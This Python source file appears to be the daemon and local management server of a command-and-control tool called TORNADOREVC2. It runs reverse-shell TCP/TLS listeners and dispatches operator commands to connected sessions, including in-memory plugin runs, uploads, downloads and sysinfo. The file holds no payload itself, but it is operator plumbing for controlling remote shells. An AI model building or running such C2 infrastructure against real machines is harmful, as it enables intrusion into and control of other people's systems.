"""Local-only management server owned by the daemon process."""

from __future__ import annotations

import io
import os
import socket
import threading
from contextlib import redirect_stdout
from typing import Any, Optional

from ..events.bus import EventBus
import time

from ..handler import TORNADOREVC2
from ..ipc.codec import read_message, write_message
from ..ipc.protocol import event, response
from ..jobs.manager import JOB_COMMANDS, JobManager
from ..jobs.store import JobStore
from . import auth
from .config import DaemonConfig
from .lifecycle import clear_runtime_state, write_runtime_state


class ManagementServer:
    def __init__(self, config: DaemonConfig, handler: TORNADOREVC2, jobs: JobManager, bus: EventBus):
        self.config = config
        self.handler = handler
        self.jobs = jobs
        self.bus = bus
        self.token = ''
        self._sock = None
        self._thread = None
        self._running = False
        self._clients = []
        self._lock = threading.Lock()

    def start(self) -> None:
        auth.ensure_runtime_dir(self.config.persistence.runtime_dir)
        self.token = auth.write_token(self.config.token_path)
        mg = self.config.management
        if mg.transport == 'unix':
            if os.path.exists(mg.socket_path):
                try:
                    os.remove(mg.socket_path)
                except OSError:
                    pass
            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            sock.bind(mg.socket_path)
            auth.secure_socket_path(mg.socket_path)
        else:
            mg.validate()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((mg.host, mg.port))
            if mg.port == 0:
                mg.port = sock.getsockname()[1]
        sock.listen(32)
        sock.settimeout(1.0)
        self._sock = sock
        self._running = True
        self._thread = threading.Thread(target=self._accept_loop, name='mgmt-ipc', daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        sock = self._sock
        self._sock = None
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        if self.config.management.transport == 'unix':
            try:
                os.remove(self.config.management.socket_path)
            except OSError:
                pass

    def _accept_loop(self) -> None:
        while self._running and self._sock is not None:
            try:
                client, _addr = self._sock.accept()
            except TimeoutError:
                continue
            except OSError:
                if self._running:
                    continue
                break
            thread = threading.Thread(target=self._handle_client, args=(client,), daemon=True)
            with self._lock:
                self._clients.append(thread)
            thread.start()

    def _handle_client(self, sock) -> None:
        try:
            while self._running:
                try:
                    message = read_message(sock)
                except (ConnectionError, OSError):
                    break
                if message.get('type') != 'request':
                    continue
                req_id = message.get('id') or ''
                method = message.get('method') or ''
                params = dict(message.get('params') or {})
                token = params.pop('_token', None)
                if not auth.check_token(self.token, token):
                    write_message(sock, response(req_id, ok=False, error='Unauthorized'))
                    break
                try:
                    result = self.dispatch(method, params, sock, req_id)
                    if result is _STREAMED:
                        continue
                    write_message(sock, response(req_id, result=result))
                except Exception as exc:
                    write_message(sock, response(req_id, ok=False, error=str(exc)))
                if method == 'daemon.stop':
                    threading.Thread(target=self._request_shutdown, daemon=True).start()
                    break
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def _request_shutdown(self) -> None:
        self.handler.shutdown_for_restart()
        self.stop()

    def dispatch(self, method: str, params: dict[str, Any], sock, req_id: str):
        if method == 'ping':
            return {'pong': True}
        if method == 'daemon.status':
            return self.status_payload()
        if method == 'daemon.stop':
            return {'stopping': True}
        if method == 'console.banner':
            return self._banner()
        if method == 'console.complete':
            return self._complete_snapshot(params.get('session_id'))
        if method == 'console.command':
            return self._console_command(params.get('line') or '')
        if method == 'session.command':
            return self._session_command(int(params['session_id']), params.get('line') or '')
        if method == 'jobs.list':
            return {'jobs': [job.summary() for job in self.jobs.list()]}
        if method == 'jobs.get':
            job = self.jobs.get(int(params['id']))
            if job is None:
                raise KeyError(f'Job {params.get("id")} not found')
            return job.as_dict()
        if method == 'jobs.attach':
            self._attach_job(sock, req_id, int(params['id']))
            return _STREAMED
        if method == 'events.subscribe':
            self._subscribe_events(sock, req_id)
            return _STREAMED
        raise KeyError(f'Unknown method {method}')

    def status_payload(self) -> dict[str, Any]:
        rs = self.config.reverse_shell
        mg = self.config.management
        counts = self.jobs.counts()
        return {
            'daemon': 'running',
            'pid': os.getpid(),
            'reverse_listeners': {
                'tcp': {'host': rs.host, 'port': rs.tcp_port},
                'tls': {'host': rs.host, 'port': rs.tls_port},
            },
            'management': {
                'transport': mg.transport,
                'socket_path': mg.socket_path if mg.transport == 'unix' else None,
                'host': mg.host if mg.transport == 'tcp' else None,
                'port': mg.port if mg.transport == 'tcp' else None,
                'local_only': True,
            },
            'sessions': self.handler.get_client_count(),
            'jobs': counts,
        }

    def _banner(self) -> dict[str, Any]:
        buf = io.StringIO()
        with redirect_stdout(buf):
            self.handler.print_banner()
        return {'output': buf.getvalue()}

    def _complete_snapshot(self, session_id=None) -> dict[str, Any]:
        session_sock = None
        if session_id is not None and str(session_id) != '':
            try:
                session_sock = self.handler._get_client_by_id(int(session_id))
            except (TypeError, ValueError):
                session_sock = None
        return {
            'session_ids': self.handler._get_client_ids(),
            'plugins': self.handler.plugins.completion_plugins(session_sock),
            'job_ids': [str(job.id) for job in self.jobs.list()],
        }

    def _console_command(self, line: str) -> dict[str, Any]:
        stripped = line.strip()
        if not stripped:
            return {'output': ''}
        parts = stripped.split()
        cmd = parts[0].lower()
        if cmd in ('exit', 'quit', 'e', 'q'):
            return {'output': '', 'exit_console': True}
        if cmd == 'jobs':
            return self._jobs_command(parts)
        if cmd in JOB_COMMANDS:
            job = self._submit_job(stripped, parts)
            return {
                'output': f'Job submitted: {job.id}\n',
                'job_id': job.id,
                'submitted': True,
            }
        sink_chunks = []

        def capture(text: str) -> None:
            sink_chunks.append(text)

        from ..execution.sink import OutputSink
        sink = OutputSink(on_write=capture)
        with redirect_stdout(sink):
            result = self.handler.dispatch_main_command(parts, shutdown_on_exit=False)
        output = ''.join(sink_chunks)
        payload = {'output': output, 'result': result}
        if result == 'attach':
            payload['attach'] = self.handler.current_client_id()
        return payload

    def _jobs_command(self, parts: list[str]) -> dict[str, Any]:
        if len(parts) == 1 or parts[1].lower() in ('list', 'ls'):
            rows = self._format_jobs()
            return {'output': rows}
        if parts[1].lower() == 'attach' and len(parts) >= 3:
            return {'attach_job': int(parts[2]), 'output': ''}
        if parts[1].lower() in ('get', 'show') and len(parts) >= 3:
            job = self.jobs.get(int(parts[2]))
            if job is None:
                return {'output': f'Job {parts[2]} not found\n'}
            return {'output': job.output + (f'\nError: {job.error}\n' if job.error else '')}
        return {'output': 'Usage: jobs [list|attach <id>|show <id>]\n'}

    def _format_jobs(self) -> str:
        jobs = self.jobs.list()
        if not jobs:
            return 'No jobs\n'
        lines = [f"{'ID':<6}{'SESSION':<12}{'STATUS':<12}{'ELAPSED':<12}OPERATION"]
        for job in jobs:
            elapsed = _format_elapsed(job.elapsed())
            session = '-' if job.session_id is None else str(job.session_id)
            lines.append(
                f'{job.id:<6}{session:<12}{job.status:<12}{elapsed:<12}{job.operation}'
            )
        return '\n'.join(lines) + '\n'

    def _submit_job(self, line: str, parts: list[str]):
        session_id = _guess_session_id(parts)
        operation = _operation_label(parts)
        command_parts = list(parts)

        def work(_ctx):
            self.handler.dispatch_main_command(command_parts, shutdown_on_exit=False)

        return self.jobs.submit(operation, work, session_id=session_id)

    def _session_command(self, session_id: int, line: str) -> dict[str, Any]:
        client = self.handler._get_client_by_id(session_id)
        if not client:
            raise KeyError(f'Client #{session_id} not active')
        sink_chunks = []
        from ..execution.sink import OutputSink
        sink = OutputSink(on_write=sink_chunks.append)
        with redirect_stdout(sink):
            result = self.handler.dispatch_session_command(client, line)
        return {'output': ''.join(sink_chunks), 'result': result}

    def _attach_job(self, sock, req_id: str, job_id: int) -> None:
        job = self.jobs.get(job_id)
        if job is None:
            write_message(sock, response(req_id, ok=False, error=f'Job {job_id} not found'))
            return
        done = threading.Event()
        finished = {'job': None}

        def on_event(evt):
            payload = evt.payload or {}
            if payload.get('id') != job_id:
                return
            if evt.name == 'job.output':
                write_message(sock, event('job.output', payload))
            elif evt.name == 'job.finished':
                finished['job'] = self.jobs.get(job_id)
                done.set()

        if job.output:
            write_message(sock, event('job.output', {'id': job_id, 'chunk': job.output}))
        if job.status not in ('RUNNING', 'QUEUED'):
            write_message(sock, response(req_id, result=job.as_dict()))
            return
        self.bus.subscribe(on_event)
        try:
            done.wait(timeout=3600)
        finally:
            self.bus.unsubscribe(on_event)
        final = finished['job'] or self.jobs.get(job_id)
        write_message(sock, response(req_id, result=final.as_dict() if final else {'id': job_id}))

    def _subscribe_events(self, sock, req_id) -> None:
        pending = []
        lock = threading.Lock()

        def on_event(evt):
            with lock:
                pending.append(evt)

        write_message(sock, response(req_id, result={'subscribed': True}))
        self.bus.subscribe(on_event)
        try:
            while self._running:
                time.sleep(0.15)
                with lock:
                    batch = list(pending)
                    pending.clear()
                for evt in batch:
                    write_message(sock, event(evt.name, evt.payload))
        except (ConnectionError, OSError):
            pass
        finally:
            self.bus.unsubscribe(on_event)


_STREAMED = object()


def _format_elapsed(seconds: float) -> str:
    total = int(seconds)
    hours, rem = divmod(total, 3600)
    minutes, secs = divmod(rem, 60)
    return f'{hours:02d}:{minutes:02d}:{secs:02d}'


def _guess_session_id(parts: list[str]) -> Optional[int]:
    cmd = parts[0].lower()
    try:
        if cmd == 'run' and len(parts) >= 3:
            if parts[1].lower() == 'inmemory':
                return int(parts[2])
            return int(parts[2])
        if cmd in ('upload', 'download'):
            args = [p for p in parts[1:] if p != '--resume']
            return int(args[0])
        if cmd == 'sysinfo':
            return int(parts[1])
    except (ValueError, IndexError):
        return None
    return None


def _operation_label(parts: list[str]) -> str:
    cmd = parts[0].lower()
    if cmd == 'run' and len(parts) >= 2:
        return f'plugin:{parts[1]}'
    return cmd


class TornadoDaemon:
    def __init__(self, config: DaemonConfig):
        self.config = config
        self.bus = EventBus()
        store = JobStore(config.persistence.jobs_dir, retention=config.persistence.retention)
        self.jobs = JobManager(
            self.bus,
            store=store,
            max_workers=config.jobs.max_workers,
            max_queued=config.jobs.max_queued,
        )
        rs = config.reverse_shell
        self.handler = TORNADOREVC2(
            host=rs.host,
            revshell_port=rs.tcp_port,
            tls_port=rs.tls_port,
            certfile=rs.certfile,
            keyfile=rs.keyfile,
        )
        self.handler.console_owns_listeners = False
        self.handler.event_bus = self.bus
        self.management = ManagementServer(config, self.handler, self.jobs, self.bus)

    def start(self, bind_listeners: bool = True) -> None:
        write_runtime_state(self.config, os.getpid())
        if bind_listeners:
            self.handler.start_listeners()
        self.management.start()

    def serve_forever(self) -> None:
        import signal

        def _handle_stop(signum, frame):
            self.handler.running = False

        try:
            signal.signal(signal.SIGTERM, _handle_stop)
        except Exception:
            pass
        try:
            while self.handler.running:
                threading.Event().wait(0.5)
        except KeyboardInterrupt:
            self.handler.running = False
        finally:
            self.shutdown()

    def shutdown(self) -> None:
        self.jobs.shutdown()
        self.management.stop()
        self.handler.shutdown_for_restart()
        clear_runtime_state(self.config)
